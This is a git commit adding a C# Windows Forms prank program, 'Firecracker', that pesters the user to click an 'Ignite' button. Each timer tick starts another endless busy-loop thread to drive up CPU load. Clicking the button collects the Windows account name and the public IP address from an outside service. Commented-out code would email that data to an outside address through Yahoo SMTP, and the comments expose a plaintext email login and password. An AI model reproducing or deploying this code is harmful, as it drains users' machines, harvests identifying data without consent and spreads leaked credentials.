ad995e8cef1aff4df6ce7db2463b16a236f1b556
Alex Weight <weighta@hotmail.com>
2019-01-26 12:12:08 -0800

    Firecracker
    Places a useless, dumb, static image of a firecracker on your screen that begs to be ignited. If the user doesn't click ignite, the computer's CPU will go up by 10%.

---
+++ Firecracker/Firecracker/Form1.Designer.cs
@@ -0,0 +1,90 @@
+﻿namespace Firecracker
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.components = new System.ComponentModel.Container();
+            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Form1));
+            this.pictureBox1 = new System.Windows.Forms.PictureBox();
+            this.button1 = new System.Windows.Forms.Button();
+            this.timer1 = new System.Windows.Forms.Timer(this.components);
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
+            this.SuspendLayout();
+            // 
+            // pictureBox1
+            // 
+            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
+            this.pictureBox1.Location = new System.Drawing.Point(0, -1);
+            this.pictureBox1.Name = "pictureBox1";
+            this.pictureBox1.Size = new System.Drawing.Size(42, 290);
+            this.pictureBox1.TabIndex = 0;
+            this.pictureBox1.TabStop = false;
+            // 
+            // button1
+            // 
+            this.button1.BackColor = System.Drawing.Color.Yellow;
+            this.button1.ForeColor = System.Drawing.Color.Red;
+            this.button1.Location = new System.Drawing.Point(0, 12);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(42, 23);
+            this.button1.TabIndex = 1;
+            this.button1.Text = "Ignite";
+            this.button1.UseVisualStyleBackColor = false;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // timer1
+            // 
+            this.timer1.Enabled = true;
+            this.timer1.Interval = 1500;
+            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.BackColor = System.Drawing.Color.Red;
+            this.ClientSize = new System.Drawing.Size(42, 280);
+            this.Controls.Add(this.button1);
+            this.Controls.Add(this.pictureBox1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
+            this.Name = "Form1";
+            this.Text = "Firecracker";
+            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.PictureBox pictureBox1;
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.Timer timer1;
+    }
+}
+
---
+++ Firecracker/Firecracker/Form1.cs
@@ -0,0 +1,89 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Threading;
+using System.Net.Mail;
+using System.Web;
+using System.Net;
+
+namespace Firecracker
+{
+    public partial class Form1 : Form
+    {
+        Random ran = new Random();
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        bool run = true;
+        private string subject;
+        private string ip;
+        private string user;
+        private string pass;
+
+        private void getInfo()
+        {
+            subject = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            ip = new WebClient().DownloadString("http://icanhazip.com");
+
+            /*
+            user = "oliveolivear@yahoo.com";
+            pass = "nitro005";
+            */
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            getInfo();
+            timer1.Enabled = false;
+            MessageBox.Show("Thank you " + subject + " " + ip + "\n for igniting the firecracker");
+            run = false;
+            //sendEmail("body");
+            this.Close();
+        }
+        private void Ignite()
+        {
+            
+            MessageBox.Show("Please ignite the firecracker");
+            Thread s = new Thread(new ThreadStart(solveQuadratic));
+            s.Start();
+            timer1.Enabled = true;
+        }
+
+        private void timer1_Tick(object sender, EventArgs e)
+        {
+            timer1.Interval = (ran.Next(2000, 6000));
+            timer1.Enabled = false;
+            Ignite();
+        }
+        private void solveQuadratic()
+        {
+            while (run)
+            {
+                int x = (int)Math.Sqrt(Math.PI);
+            }
+        }
+        /*
+        private void sendEmail(string body)
+        {
+            MailMessage mail = new MailMessage(user, "olivearlerel@gmail.com", "ip", body);
+            //SmtpServer = smtp.company.com; Ex: Gmail - smtp.gmail.com | Yahoo - symtp.yahoo.com
+            SmtpClient client = new SmtpClient("smtp.yahoo.com");
+            // Port 587 is preferred port for mail submission. Port 25 is widely abused by malware.
+            client.Port = 587;
+            client.Credentials = new System.Net.NetworkCredential(user, pass);
+            client.EnableSsl = true;
+            client.Send(mail);
+            MessageBox.Show("Sent!");
+
+        }
+        */
+    }
+}
